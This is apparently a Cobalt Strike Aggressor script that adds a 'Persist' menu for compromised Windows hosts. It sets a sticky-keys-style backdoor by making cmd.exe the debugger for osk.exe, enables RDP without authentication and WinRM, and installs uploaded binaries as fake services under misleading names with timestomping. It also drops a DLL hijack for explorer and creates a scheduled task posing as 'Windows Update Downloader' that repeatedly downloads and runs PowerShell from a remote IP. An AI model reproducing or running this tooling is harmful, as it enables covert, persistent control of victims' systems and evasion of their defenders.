### Got to create the files for upload.

sub stickykeys {
    binput($1, 'stickykeys');
    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f');
    bshell($1, 'REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe" /f');
    bshell($1, 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d "0" /f');
    bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
    bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
    bshell($1, 'net start TermService');

    binput($1, 'enable WinRM');
    bpowershell($1, 'Enable-PSRemoting -Force');
}
sub persist_adsvc {
    if (-exists script_resource("adsvc.exe")) {
        binput($1, "service persistence (server) [AD]");
        bcd($1, 'c:\windows\system32');
        bupload($1, script_resource("adsvc.exe"));
        btimestomp($1, "adsvc.exe", "cmd.exe");
        bshell($1, 'sc delete adsvc');
        bshell($1, 'sc create adsvc binPath= "C:\windows\system32\adsvc.exe" start= auto DisplayName= "Active Directory Service"');
        bshell($1, 'sc description adsvc "Provides authentication and policy management for computers joined to domain."');
        bshell($1, 'sc start adsvc');

    }
    else {
        berror($1, "adsvc.exe does not exist :(");
    }
}

sub persist_netsys {
    if (-exists script_resource("netsys.exe")) {
        binput($1, "service persistence");
        bcd($1, 'c:\windows\system32');
        bupload($1, script_resource("netsys.exe"));
        btimestomp($1, "netsys.exe", "cmd.exe");
        bshell($1, 'sc delete netsys');
        bshell($1, 'sc create netsys binPath= "C:\windows\system32\netsys.exe" start= auto DisplayName= "System Network Monitor"');
        bshell($1, 'sc description netsys "Monitors the networks to which the computer has connected, collects and stores information about these networks, and notifies registered applications of state changes."');
        bshell($1, 'sc start netsys');
    }
    else {
        berror($1, "netsys.exe does not exist :(");
    }
}

sub persist_linkinfo {
    # dll hijack on explorer.exe
    if (-exists script_resource("linkinfo.dll")) {
        binput($1, "dropping linkinfo.dll persistence");
        bcd($1, 'c:\windows');
        bupload($1, script_resource("linkinfo.dll"));
        btimestomp($1, "linkinfo.dll", 'c:\windows\sysnative\linkinfo.dll');
    }
    else {
        berror($1, "linkinfo.dll not found.");
    }
}

sub persist_schjob {
    bshell($1, 'schtasks /create /TN "Windows Update Downloader" /SC Minute /MO 5 /TR "powershell -nop -c \"IEX ((new-object net.webclient).downloadstring(\'http://192.168.133.7:80/a\'))\"');
    }

popup beacon_top {
    menu "Persist" {
        item "Persist (DNS)" {
            local('$bid');
            foreach $bid ($1) {
                persist_netsys($bid);
            }
        }

        item "Persist (HTTP)" {
            local('$bid');
            foreach $bid ($1) {
                persist_linkinfo($bid);
            }
        }

        item "Persist (SMB)" {
            local('$bid');
            foreach $bid ($1) {
                persist_adsvc($bid);
            }
        }

        item "Sticky Keys" {
            local('$bid');
            foreach $bid ($1) {
                stickykeys($bid);
            }
        }
        
	    item "Scheduled Job" {
	        local('$bid');
	        foreach $bid ($1) {
            	persist_schjob($bid);
	        }   
    	}
    }
}
